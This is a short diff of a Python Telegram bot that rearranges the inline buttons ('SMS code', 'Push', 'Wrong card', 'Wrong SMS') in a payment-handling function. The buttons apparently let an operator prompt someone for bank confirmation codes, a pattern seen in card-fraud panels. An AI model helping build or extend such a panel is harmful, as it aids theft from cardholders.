@@ -520,11 +520,11 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
     buttons = [
         [
             InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms:{payment_id}:{user_id}"),
-            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push:{payment_id}:{user_id}"),
-            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card:{payment_id}:{user_id}")
+            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push:{payment_id}:{user_id}")
         ],
         [
-            InlineKeyboardButton(text="❌ Неверный SMS код", callback_data=f"wrong_sms:{payment_id}:{user_id}")
+            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card:{payment_id}:{user_id}"),
+            InlineKeyboardButton(text="❌ Неверный SMS", callback_data=f"wrong_sms:{payment_id}:{user_id}")
         ]
     ]
     
@@ -1630,6 +1630,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
